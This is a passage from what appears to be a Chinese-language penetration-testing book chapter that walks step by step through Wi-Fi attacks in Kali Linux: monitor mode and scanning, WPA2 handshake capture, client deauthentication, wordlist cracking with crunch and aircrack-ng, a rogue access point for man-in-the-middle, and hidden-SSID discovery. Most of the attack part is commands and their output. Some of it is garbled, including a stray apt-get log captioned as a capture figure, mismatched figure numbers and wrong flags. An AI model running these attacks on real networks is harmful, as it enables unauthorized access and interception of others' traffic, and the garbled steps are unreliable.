
```
ummedmeel@kali:~~
$ sudo iwconfig wlan0 mode monitor
ummedmeel@kali:~~
$ iwconfig wlan0
wlan0     IEEE 802.11b SSID:"WIFIGREALTEK"
Mode:Monitor Frequency:2.412 GHz Access Point:Not-Associated
Sensitivity:0
Retry RTS thr:off Fragment frag:0
PowerManagement:off
Link Quality:0 Signal level:0 Noise level:0
Rx invalid wmid:0 Rx invalid crypt:0 Rx frag:0
Tx excessive retries:0 Invalid misc:0 Missed beacon:0
```

图 7.9：无线局域网接口到监控模式

4. 使用命令`sudo ifconfig wlan0 up`激活无线局域网接口。见图 7.10 的视觉表示：

```
ummedmeel@kali:~~
$ sudo ifconfig wlan0 up
```

图 7.10：激活无线局域网接口

5. 运行如图 7.11 所示的`ifconfig`命令来验证接口是否已处于监控模式：

```
ummedmeel@kali:~~
$ iwconfig
lo no wireless extensions.
eth0 no wireless extensions.
wlan0
ununassociated SSID="*WIFI@REALTEK*"
Mode:Auto Frequency=2.412 GHz Access Point: Not-Associated
Sensitivity:0/0
Retry:off RTS thr:off Fragment thr:off
Power Management:off
Link Quality:0 Signal level:0 Noise level:0
Rx invalid swarm:0 Rx invalid frag:0
Tx excessive retries:0 Invalid misc:0 Missed beacon:0
```

图 7.11：验证接口是否处于监控模式

6. 使用命令`sudo airodump-ng wlan0`扫描可用的无线网络，如图 7.12 和 7.13 所示：

命令在下面的图 7.12 中：

```
ummedmeel@kali:~~
$ sudo airodump-ng wlan0
```

图 7.12：查看可用无线网络的命令

在图 7.13 中，你可以看到可用的无线网络及其 BSSID 和 ESSID：

CH 18 | Elapsed: 54 s | 2023-05-07 14:14

| BSSID | Power Beacons | #Data, #4 | CH | MB | CIPHER | AUTH ESSID |

|---|---|---|---|---|---|---|---|

| BA:32:14:AF:8A:93 | -93 | 9 | 0 | 6 | 270 | PSK | Tenda_Extender |

| AA:D6:94:7A:8B:61 | -82 | 9 | 0 | 6 | 139 | PSK | TP-Link_capoor |

| A4:A7:A7:D3:E2:09 | -89 | 0 | 0 | 6 | 139 | PSK | Jervis_2.4 |

| E4:B8:F0:D2:8C:62 | -85 | 0 | 0 | 6 | 139 | PSK | Home-Karsvik |

| F6:B8:F0:D2:8C:63 | -96 | 11 | 0 | 1 | 138 | PSK | Pawn-24 |

| C4:F1:F3:99:8E:31 | -85 | 10 | 1 | 7 | 238 | PSK | Home_WiFi |

| B4:F1:F3:99:8E:30 | -92 | 0 | 0 | 7 | 270 | PSK | Inky_georb |

| D4:F1:F3:99:8E:29 | -93 | 0 | 0 | 7 | 270 | PSK | Home_WiFi |

| D3:F1:F3:99:8E:28 | -93 | 0 | 0 | 7 | 270 | PSK | Sunderer_PG1602 |

| B3:F1:F3:99:8E:27 | -93 | 0 | 0 | 7 | 270 | PSK | My_Network |

| F6:B8:F0:D2:8C:64 | -93 | 2 | 0 | 8 | 270 | PSK | www.excital.com |

| 00:14:22:01:35 | -93 | 0 | 0 | 8 | 270 | PSK | 5198 |

| 10:8B:F0:29:26:53 | -93 | 0 | 0 | 9 | 270 | PSK | 5197 |

| A4:A7:A7:D3:E2:08 | -93 | 0 | 0 | 9 | 270 | PSK | Linksys |

| C4:E5:32:A1:E0:28 | -75 | 108 | 9 | 139 | PSK | unmeed-AP-target |

图 7.13：扫描无线网络的的数据包

7. 使用`airodump-ng --ssid <target_BSSID> -c <channel> -w <output_file> wlan0`选择目标网络并捕获包，如图 7.14 和 7.15 所示：此处 BSSID 代表基本集合标识符（Basic Set Identifier）。图 7.14 展示了数据捕获所需的命令：

```
unmeed@kali)
$ sudo airodump-ng --ssid C4:E5:32:A1:E0:28 -c 1 -w packetoutput wlan0
```

图 7.14：启动数据包的命令

CH 1 | Elapsed: 3 mins | 2023-05-07 14:37

| BSSID | PWR Beacons | #Data, #4 | CH | MB | CIPHER | AUTH ESSID |

|---|---|---|---|---|---|---|

| C4:E5:32:A1:E0:28 | -62 | 93 | | 210 | | | unmeed-AP-target |

图 7.15：选择目标网络并捕获数据包（输出）

8. 一旦捕获了足够的包，使用命令`sudo aircrack-ng -w <wordlist> <output_file.cap>`来破解无线密码，如图 7.16 和 7.17 所示：

图 7.16 展示了破解密码所需的命令：

```
ummedmeel@kali:~~
$ sudo aircrack-ng -w passwordlist.txt packetoutput-02.cap
```

图 7.16：破解无线密码的命令

图 7.17 显示了破解命令的输出：

```
Aircrack-ng 1.7
[00:00:00] 12/5 keys tested (50.22 k/s)
Time offset: 0 80.00%

KEY FOUND! [ B0219317 ]

Master Key : FE 11 80 D3 A07 98 13 D5 86 E6 E0 A9 91 86 8F C7
26 8B 40 30 3B 8E 91 35 49 54 C1 81 38 07 20 15 80

Transient Key : C9 78 A9 46 EF 55 C3 C8 D8 DC C1 9F F2 98 C1 C2
E7 82 97 26 F7 07 08 3B CC 4F 48 94 67 55
1C 51 8B 99 26 21 86 50 C6 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00

APOL HMAC : 65 08 FC C5
```

第 2 章 [耗时: 4 分 | 2023-05-07 21:34] WPA 握手: C4:E5:32:A1:E0:28

| BSSID |  Beacon | #数据 | #cs | MB | 加密算法 | 认证 ESSID |

|---|---|---|---|---|---|---|---|

| BSSID | STATION | PWR | Rate | Lost | Frames | PSK | Probes |

| C4:E5:32:A1:E0:28 | | -66 | 8117 | 1 | 1020 | WPA | PSK | 345 EAPOL Redmi123,ummeel-AP-target |

| C4:E5:32:A1:E0:28 | | -66 | 34 | 24 | | | 247 EAPOL | ummeel-AP-target |

| C4:E5:32:A1:E0:28 | | -71 | 32 | 0 | | | | | |

| (未关联) | | -82 | 04 | 0 | | | | | | |

| (未关联) | | -84 | 24 | 0 | | | | | | |

| (未关联) | | -18 | 15 | 0 | | | | | | |

| (未关联) | | -96 | 0 | 0 | | | | | | |

| (未关联) | | -92 | 0 | 0 | | | | | | Airtel_350 |

| (未关联) | | -94 | 5 | 0 | | | | | | 23 |

| (未关联) | | -65 | 11 | 0 | | | | | | |

| (未关联) | | -90 | 0 | 0 | | | | | | |

| (未关联) | | -94 | 0 | 0 | | | | | | |

## 获取 BSSID 和广播信道

4. 一旦获取了 BSSID 和广播信道信息，运行命令`sudo airodump-ng wlan0 -c 1 -b C4:E5:32:A1:E0:28 -w output_file`来从 AP 捕获包，如图 21 和 22 所示。图 21 展示了捕获包所需的命令：

```bash
ummeed@kali~$ sudo airodump-ng wlan0 -c 1 -b C4:E5:32:A1:E0:28 -w captureoutput
```

图 22：密码命令

```bash
ummeed@kali~$ sudo apt-get update
Ign: https://security.github.com/kali-rolling stable
Get: https://security.github.com/kali-rolling stable
Err: 10.255.198.153 Not Found to fetch kali-Release [4.2 KB]
Get: http://archive.kali.org/kali-rolling/main [95.3 MB]
Get: http://archive.kali.org/kali-rolling/updates [64.1 MB]
Get: http://archive.kali.org/kali-rolling/contrib [272 KB]
Get: http://archive.kali.org/kali-rolling/main [217 KB]
Get: http://archive.kali.org/kali-rolling/non-free-contrib [928]
Reading package lists: Done
E: The repository https://security.github.com/kali-rolling does not have a Release File. Updating from such repository cannot be secure, therefore disabled by default.
E: The repository https://security.github.com/kali-rolling does not have a Release File. Updating from such repository cannot be secure, therefore disabled by default.
N: apt-get manage for repository creation.
```

图 22：从 AP 捕获包

5. 为了生成 IV，运行命令`sudo airoplay-ng --deauth 0 -c C4:E5:32:A1:E0:28`使连接 AP 的客户端取消认证。捕获包含 WPA2 密钥或密码的握手包。见图 7.23：

```bash
ummeed@kali~$ sudo airoplay-ng --deauth 0 -c C4:E5:32:A1:E0:28 wlan0
21:56:32 Waiting for frame B64 DeAuth. STAC: [C8:94:02:B4:66] [67/74]
21:56:33 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [65/66]
21:56:34 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [71/74]
21:56:34 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [60/68]
21:56:35 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [64/68]
21:56:36 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [64/65]
21:56:37 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [65/66]
21:56:38 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [64/66]
21:56:39 Sending 64 DeAuth. STAC: [C8:94:02:B4:66] [64/66]
```

> 图 7.23：使连接 AP 的客户端取消认证

你可以通过暴力破解或运行 wrench 命令攻击来破解 WPA2 密码。要破解它，使用命令`crunch 8 8 B123790 -o newlist.txt; sudo aircrack-ng -w newlist.txt newcaptureoutput-01.cap`，如图 7.24 和 7.25 所示。

攻击成功后，你可以获得目标 AP 的准确密码：

```bash
ummeed@kali~$ sudo crunch 8 8 B123790 -o newlist.txt; sudo aircrack-ng -w newlist.txt newcaptureoutput-01.cap
```

> 图 7.24：密码破解命令的输出：

```
Aircrack-ng 1.7
00:13:29 71116/56408 keys tested (893.59 keys/s)
Time left: 1 hour, 34 minutes, 15 seconds
12.33% KEY FOUND!
Master Key : FE110B03A7D385E9
transient Key : 4E0B03A77935A16F1D8C23F2
5F4B7A2509D1FAAE5C5717E0
EAPOL HMAC
```

> 图 7.25：破解 WPA2 密码（输出）

## 使用伪造热点的中间人攻击

在本节中，我们将讨论在无线网络上执行中间人攻击的步骤，拦截并修改接入点与客户端之间的通信。我们将使用伪造热点演示中间人攻击：

1. 将 TP-Link WN72N 或任何外部 Wi-Fi 适配器连接到你的 Kali 机器，确保其处于监控模式以继续步骤。

2. 使用命令`sudo airbase-ng -e <SSID> -c <channel> -P wlan0`创建具有自定义 SSID 和安全设置的伪造热点，如图 7.26 所示：

```bash
$ sudo airbase-ng -e RogueAP -c 6 -P wlan0
14:28:39 Created interface at
14:28:39 Trying to set MTU on 0 to 1500
14:28:39 Access Point with SSID:E3 started.
14:28:39 Client C8:94:02:B4:66:71 (unencrypted) to SSID:RogueAP
14:29:51 Client C8:94:02:B4:66:71 (unencrypted) to SSID:RogueAP
```

> 图 7.26：具有自定义 SSID 的伪造热点

## 绕过隐藏 SSID

隐藏 SSID 在某些情况下非常有用，例如对无线网络进行安全审计。可以使用 mdk3 工具检测隐藏 SSID。以下是步骤：

1. 在终端运行命令`sudo apt install mdk3`安装 mdk3，如图 7.28 所示。

```bash
ummeed@kali~$ sudo apt install mdk3
Building dependency tree ...
Reading package lists ... Done
```

> 图 7.28：安装 mdk3

2. 使用命令`airodump-ng wlan0`扫描网络。在输出中，你可以发现 MAC 地址 C4:E5:32:A1:E0:28 的 SSID 是隐藏的，且运行在信道 11 上。见图 7.29：

| 信道 | B | #数据 | MB | 加密算法 | 认证 |

|---|---|---|---|---|---|

| C4:E5:32:A1:E0:28 | 93 | 4 | 0 | WPA | TKIP | Ashlik |
